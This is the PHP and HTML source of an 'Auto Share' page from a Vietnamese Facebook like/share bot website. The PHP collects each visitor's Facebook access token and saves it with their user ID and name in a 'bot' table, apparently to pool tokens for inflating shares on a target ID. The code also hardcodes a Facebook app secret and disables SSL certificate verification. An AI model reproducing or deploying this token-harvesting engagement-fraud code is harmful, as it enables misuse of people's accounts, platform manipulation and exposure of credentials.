<?php
include'head.php';
include'demtoken';
require 'facebook.php';
session_start();
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
$lamafile = 900;
$waktu = time();
if ($handle = opendir('share')) {
while(false !== ($file = readdir($handle)))
{
$akses = fileatime('share/'.$file);
if( $akses !== false)
if( ($waktu- $akses)>=$lamafile )
unlink('share/'.$file);
}
closedir($handle);
}
function get_html($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return $data;
    }
$token = $_SESSION[access_token];
if($token){
	$graph_url ="https://graph.facebook.com/me?fields=id,name&access_token=" . $token;
	$user = json_decode(get_html($graph_url));
	if ($user->error) {
		if ($user->error->type== "OAuthException") {
			session_destroy();
			header('Location: index.php?i=Token Hết Hạn -_- Vui Lòng Làm Mới Token');
			}
		}
	}
	else{
	header('Location: index.php');
	}
$fb_secret  = $_GET["sec"];
$fb_app_url  = 'https://ph.superlike.org/m.php';
include 'config.php';
$facebook = new Facebook(array(
   'appId' => '111160212353538',
   'secret' => 'd2d951a8566758675db1dbd50327013c',
   'cookie' => true
));


   mysql_query("CREATE TABLE IF NOT EXISTS `bot` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `user_id` varchar(32) NOT NULL,
      `name` varchar(32) NOT NULL,
      `access_token` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
   ");


if($userData){

if($userData['id'] =="40" 
|| $userData['id'] =="4" 
){
echo "Have a Nice Day ^_^, You got Blocked...!!";
exit;
}
if($os=opendir('share')) {
      while($ls = readdir($os)){
       if($ls != "." && $ls != ".."){
if($userData['id'] =="$ls"){
$limit = fileatime('share/'.$user->id);
$timeoff = time();
$cek = date("i:s",$timeoff - $limit);
echo '<div align="center">Next Submit : <font color="red">'.$user->name.'</font><p>
<font color="red">'.$cek.' - 15:00</font></p></div> ';
exit;
}
}
}
}
   //check that user is not already inserted? If is. check it's access token and update if needed
   //also make sure that there is only one access_token for each user
   $row = null;
   $result = mysql_query("
      SELECT
         *
      FROM
         bot
      WHERE
         user_id = '" . mysql_real_escape_string($userData['id']) . "'
   ");
   
   if($result){
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      if(mysql_num_rows($result) > 1){
         mysql_query("
            DELETE FROM
               bot
            WHERE
               user_id='" . mysql_real_escape_string($userData['id']) . "' AND
               id != '" . $row['id'] . "'
         ");
      }
   }
   
   if(!$row){
      mysql_query(
         "INSERT INTO 
            bot
         SET
            `user_id` = '" . mysql_real_escape_string($userData['id']) . "',
            `name` = '" . mysql_real_escape_string($userData['name']) . "',
            `access_token` = '" . mysql_real_escape_string($token) . "'
      ");
   } else {
      mysql_query(
         "UPDATE 
            bot
         SET
            `access_token` = '" . mysql_real_escape_string($token) . "'
         WHERE
            `id` = " . $row['id'] . "
      ");
   }
}

?>
<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="utf-8">
<meta https-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta https-equiv="content-type" content="text/html; UTF-8" />
<meta https-equiv="cache-control" content="cache" />
<meta https-equiv="content-language" content="vi" />
<meta https-equiv="revisit-after" content="1 days" />
<meta name="google-site-verification" content="OQdFDEqm92LdrjA5rg0R5O2J9UylUwsFrE8_12Yt5C8" />

<!-- SEO -->
<title>Bot-Ex.Org | Công Cụ Đắc Lực Giúp Bạn Quản Lí Tài Khoản Facebook Một Cách Tự Động Hóa.</title>

<meta name="description" content="Bot-Ex.Org Là Một Công Cụ Đắc Lực Giúp Bạn Quản Lí Tài Khoản Facebook Một Cách Tự Động Hóa. Bao Gồm Các Chức Năng Như: Bot Like, Bot Auto Comment, Bot Ex Like, Bom Like, Bom Cmt, Bom Wall, Bot Auto Reply Inbox, Bot Auto Update Stt, Bot Delete Stt, Bot Auto Confirm Friend Request, Bot Auto Poke, Auto Like, Auto Share, Auto Sub Facebook..." />
<meta name="keywords" content="Bot-Ex.Org, tang like, hack like facebook, buff like, hack like viet nam, trang web hack like facebook, auto like viet nam, buff like viet nam,cách tăng like stt facebook, hack like ảnh facebook, hack like comment facebook, tăng like ảnh facebook, cách hack tăng like,share code auto like, xin code auto like, web auto like" />
<meta name="author" content="Phạm Mạnh CƯờng" />
<meta name="copyright" content="Bot-Ex.Org" />
<meta name="robots" content="index, follow" />
<meta property="fb:admins" content="https://www.facebook.com/100010380468626" />
<meta property="og:url" content="https://Bot-Ex.Org/" />
<meta property="og:type" content="website" />
<meta property="og:description" content="Bot-Ex.Org Là Một Công Cụ Đắc Lực Giúp Bạn Quản Lí Tài Khoản Facebook Một Cách Tự Động Hóa. Bao Gồm Các Chức Năng Như: Bot Like, Bot Auto Comment, Bot Ex Like, Bom Like, Bom Cmt, Bom Wall, Bot Auto Reply Inbox, Bot Auto Update Stt, Bot Delete Stt, Bot Auto Confirm Friend Request, Bot Auto Poke, Auto Like, Auto Share, Auto Sub Facebook..." />
<meta property="og:title" content="Bot-Ex.Org Là Một Công Cụ Đắc Lực Giúp Bạn Quản Lí Tài Khoản Facebook Một Cách Tự Động Hóa. Bao Gồm Các Chức Năng Như: Bot Like, Bot Auto Comment, Bot Ex Like, Bom Like, Bom Cmt, Bom Wall, Bot Auto Reply Inbox, Bot Auto Update Stt, Bot Delete Stt, Bot Auto Confirm Friend Request, Bot Auto Poke, Auto Like, Auto Share, Auto Sub Facebook..." />
<meta property="og:image" content="../images/banner.jpg" />
<meta property="og:locale" content="vi_VN" />

<!-- Bootstrap core CSS -->
<link href="../css/bootstrap.css" rel="stylesheet">
<link href="../css/docs.min.css" rel="stylesheet">
<link href="../css/main.css" rel="stylesheet">
<link rel="stylesheet" href="../css/smoke.css">
<link rel="stylesheet" href="../css/materialize.css">
<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
<link rel="canonical" href="Bot-Ex.Org" />
<link rel="shortcut icon" href="../images/favicon.ico" />
<link rel="alternate" href="https://Bot-Ex.Org/" hreflang="vi-vn" />

</head>
<body>
<style type="text/css"> 
HTML,BODY{cursor: url("../hub/c1.cur"), url("../hub/c1.cur"), auto;} 
A:hover,#submit{cursor: url("../hub/c2.cur"), url("../hub/c2.cur"), auto;} 
</style>

<script type="text/javascript" src="../js/jquery-1.8.1.js"></script>
<script src="../js/transition.js"></script>
<script src="../js/smoke.min.js"></script>
<script src="../js/bootstrap.min.js"></script>
<script src="../js/mainjs.js"></script>

<!-- Google Analytics -->
<?php include_once("analyticstracking.php") ?>

<!-- End Google Analytics -->

<!-- Apps Facebook -->
<script>
  window.fbAsyncInit = function() {
    FB.init({
      appId      : '1626028714353005',
      xfbml      : true,
      version    : 'v2.4'
    });
  };

  (function(d, s, id){
     var js, fjs = d.getElementsByTagName(s)[0];
     if (d.getElementById(id)) {return;}
     js = d.createElement(s); js.id = id;
     js.src = "//connect.facebook.net/en_US/sdk.js";
     fjs.parentNode.insertBefore(js, fjs);
   }(document, 'script', 'facebook-jssdk'));
</script>

<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/vi_VN/sdk.js#xfbml=1&version=v2.4&appId=1626028714353005";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<!-- End Apps Facebook -->

<script type="application/ld+json">
{
 "@context":"https://schema.org",
 "@type":"WebSite",
 "url":"https://Bot-Ex.Org/",
 "potentialAction":
 {
 "@type":"SearchAction",
 "target":"https://Bot-Ex.Org/?s={search_term}",
 "query-input":"required name=search_term"
}
}
</script>
<!-- /Fixed navbar -->
<script type="text/javascript" >
$(function() {
$(".submit").click(function() {
$("#controller").hide();
$( "#finish" ).show();
});
});
</script>
<script type="text/javascript" >
function loadit()

{

$("#controller").hide();

$("#finish").show();

}
</script>
<script>
var seconds = <?php
echo $countdown;?>;
function secondPassed() {
    var minutes = Math.round((seconds - 30)/60);
    var remainingSeconds = seconds % 60;
    if (remainingSeconds < 10) {
        remainingSeconds = "0" + remainingSeconds;  
    }
    document.getElementById('countdown').innerHTML = "<h3>--> Next Submit: Wait  " + minutes + ":" + remainingSeconds + "  Seconds <--</h3>";
    if (seconds <= 0) {
        clearInterval(countdownTimer);
        document.getElementById('countdown').innerHTML = "<h3>--> Next Submit: READY....! <--</h3>";
    } else {
        seconds--;
    }
}
 
var countdownTimer = setInterval('secondPassed()', 1000);
</script>
<br>
<div class="container">    


 <div class="panel panel-primary">
<div class="panel-heading">
                                <h3 class="panel-title"><span class="glyphicon glyphicon-signal"></span> Auto Share</h3>
                            </div>

	<div id="bodyupcmt" class="panel-body">
<center>
<img style="box-shadow:0px 5px 35px ;margin-left: auto; margin-right: auto;display:block;" src="https://i.imgur.com/4TjMdgU.png" alt="Auto Share">
 </center>
<br>
		<form action="lenshare.php" method="post">	

<div class="input-group">
<input type="hidden" name="user" value="<?php echo $token; ?>" />
<input type="text" name="uid" class="form-control" value="" placeholder="Nhập ID Cần Auto Share Vào Đây...!!!" autofocus="" required="">
				<span class="input-group-btn">
	<button type="submit" name="submit" onclick="loadit()" class="btn btn-primary">
						<span id="btn-click">
						<span class="glyphicon glyphicon-transfer"></span> Tăng Lượt Share </span>
				</button>					</span>

	</div>
	
		</form></div>			

<div class="panel-footer">
				Next Submit:<? echo $cek ?> READY. <span class='glyphicon glyphicon-circle'></span>			</div>	

		</div></div>

<div id="finish" style="display:none;position: fixed;top: 0;left: 0;width: 100%;height: 100%;background: #f4f4f4;z-index: 99;">
<div class="text" style="position: absolute;top: 45%;left: 0;height: 100%;width: 100%;font-size: 18px;text-align: center;"><center>
<img height="150px" width="150px" src="https://intuitglobal.intuit.com/delivery/cms/prod/sites/default/intuit.ca/images/quickbooks-sui-images/loader.gif"></center>
Yêu cầu đang được gửi! Vui lòng chờ trong giây lát!
</div>
</div>
	<!-- ============================ End ============================ -->
<script type="text/javascript" >
$(function() {
$(".submit").click(function() {
$("#pageBody").hide();
$( "#finish" ).show();
});
});
</script>
<br><center><a class="btn btn-primary" href="index.php?act=menu "> [+] Chức Năng Khác [+] </a><br></center>
<footer class="page-footer ">
      <div class="container">
        <div class="row">
          <div class="col-md-4">
            <h5 class="white-text">About</h5>
            <p class="grey-text text-lighten-4">Chúng tôi là nhóm Bot Facebook. Được xây dựng trên nền Bootstrap. Nó sở hữu 1 tốc độ khá nhanh và chuyên nghiệp. Mọi ý kiến đóng góp và tài trợ chúng tôi đều đánh giá cao.</p>
          </div>
          <div class="col-md-4">
            <h5 class="white-text">Chat Room</h5>
            <p class="grey-text text-lighten-4">Chúng tôi có một phòng chat là nơi mà bạn có thể nói chuyện trực tiếp với chúng tôi. Hãy đến và thảo luận về các tính năng mới, mục tiêu trong tương lai, các vấn đề chung hoặc câu hỏi, hoặc bất cứ điều gì khác mà bạn có thể nghĩ đến.</p>
            <a class="btn btn-md blue lighten-3" target="_blank" href="https://chatwing.com/kbotfbnet"><i class="fa fa-comments-o"></i> Chat</a>
          </div>
          <div class="col-md-2" style="overflow: hidden;">
            <h5 class="white-text">Stats</h5>
<p><!-- Histats.com  START  (standard)-->
<script type="text/javascript">document.write(unescape("%3Cscript src=%27https://s10.histats.com/js15.js%27 type=%27text/javascript%27%3E%3C/script%3E"));</script>
<a href="https://www.histats.com" target="_blank" title="Website Statistics" ><script  type="text/javascript" >
try {Histats.start(1,3138818,4,438,112,75,"00011111");
Histats.track_hits();} catch(err){};
</script></a>
<noscript><a href="https://www.histats.com" target="_blank"><img  src="https://sstatic1.histats.com/0.gif?3138818&101" alt="Website Statistics" border="0"></a></noscript>
<!-- Histats.com  END  --></p> 
<p><a href="https://www.dmca.com/Protection/Status.aspx?ID=5438ffd4-8966-4975-8fc3-c5a02ef8d77f" title="DMCA.com Protection Status" class="dmca-badge"> <img src ="//images.dmca.com/Badges/dmca_protected_sml_120k.png?ID=5438ffd4-8966-4975-8fc3-c5a02ef8d77f"  alt="DMCA.com Protection Status" /></a></p>    
          </div>
        </div>
      </div>
      <div class="footer-copyright">
        <div class="container">
        © 2015 Bot Team Facebook, All rights reserved.
        <a class="grey-text text-lighten-4 pull-right" href="https://www.facebook.com/100010380468626">Made by Phạm Mạnh Cường</a>
        </div>
      </div>
    </footer>

<!-- POPUP USER + ID-->
<div class="modal" id="modal_get_user_info">
	<div class="modal-dialog">
		<div class="modal-content">
			<div class="modal-header">
				<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
				<h4 class="modal-title">Kiểm tra thông tin người dùng</h4>
			</div>
			<div class="modal-body">
				<form id="get_user_info_form" method="POST" onsubmit="return false;">
					<div class="form-group">
						<div class="input-group">
							<span class="input-group-addon"><span class="glyphicon glyphicon-user"></span></span>
							<input type="text" class="form-control" id="get_user_info_input" placeholder="User Name or ID" required>
							<span class="input-group-btn">
								<button type="submit" id="get_user_info_submit" data-loading-text="Loading..." class="btn btn-default">GET</button>
							</span>
						</div>
					</div>
				</form>
				<div id="get_user_info_result" style="display:none;"></div>
			</div>
		</div><!-- /.modal-content -->
	</div><!-- /.modal-dialog -->
</div>

<div class="modal" id="modal_get_id_stt">
	<div class="modal-dialog">
		<div class="modal-content">
			<div class="modal-header">
				<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
				<h4 class="modal-title">Lấy ID Status, Ảnh, Video</h4>
			</div>
			<div class="modal-body">
				<form id="get_id_stt_form" method="POST" onsubmit="return false;">
					<div class="form-group">
						<div class="input-group">
							<span class="input-group-addon"><span class="glyphicon glyphicon-link"></span></span>
							<input type="text" class="form-control" id="get_id_stt_input" placeholder="Nhập Link Status/Ảnh cần lấy ID" required>
							<span class="input-group-btn">
								<button type="submit" class="btn btn-default">GET</button>
							</span>
						</div>
					</div>
				</form>
				<div id="get_id_stt_result" style="display:none;"></div>
			</div>
		</div><!-- /.modal-content -->
	</div><!-- /.modal-dialog -->
</div>

<!-- /Container -->

</body> </html>